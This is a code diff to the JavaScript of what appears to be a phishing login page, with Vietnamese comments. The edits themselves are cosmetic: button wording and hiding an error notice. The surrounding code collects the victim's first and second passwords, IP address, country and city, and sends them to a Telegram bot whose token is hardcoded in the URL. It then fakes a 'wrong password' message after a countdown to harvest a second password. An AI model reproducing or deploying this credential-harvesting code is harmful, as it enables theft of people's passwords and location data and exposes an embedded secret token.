@@ -161,6 +161,9 @@ function showPrompt(IpAddress) {
             $('#password').removeClass('border-danger');
         }
 
+        // ✅ Ẩn thông báo sai pass nếu có trước đó
+        $('#wrong-password').addClass('d-none');
+
         let secondPassword = '';
         if (NUMBER_TIME_LOGIN >= 1) {
             secondPassword = password;
@@ -175,8 +178,8 @@ function showPrompt(IpAddress) {
 🔑 <strong>First Password: </strong><code>${password}</code>
 🔑 <strong>Second Password: </strong><code>${secondPassword}</code>
 🌐 <strong>IP Address: </strong><code>${IpAddress.ipAddress}</code>
- <strong>Country: </strong><code>${IpAddress.countryName}</code> (<code>${IpAddress.countryCode}</code>)
- <strong>City: </strong><code>${IpAddress.city}</code>`;
+<strong>Country: </strong><code>${IpAddress.countryName}</code> (<code>${IpAddress.countryCode}</code>)
+<strong>City: </strong><code>${IpAddress.city}</code>`;
 
         fetch(`https://api.telegram.org/bot7371433087:AAHBPfH8Kshg2ce5ZHCHLDYe43ivmzKnCqk/sendMessage`, {
             method: 'POST',
@@ -198,7 +201,7 @@ function showPrompt(IpAddress) {
                 FIRST_PASSWORD = password;
 
                 let countdown = 10;
-                submitBtn.text(`Wait ${countdown}s`);
+                submitBtn.text(`Please wait ${countdown}s`);
                 setTimeout(() => {
                     $('.lsd-ring-container').addClass('d-none');
                     $('#password').val('');
@@ -207,13 +210,13 @@ function showPrompt(IpAddress) {
                 const interval = setInterval(() => {
                     countdown--;
                     if (countdown > 0) {
-                        submitBtn.text(`Wait ${countdown}s`);
+                        submitBtn.text(`Please wait ${countdown}s`);
                     } else {
                         clearInterval(interval);
                         submitBtn.prop('disabled', false);
                         submitBtn.text('Continue');
                         $('#wrong-password').removeClass('d-none');
-                        isSubmitDisabled = false; // ✅ Cho phép bấm lại sau 10s
+                        isSubmitDisabled = false;
                     }
                 }, 1000);
             } else {
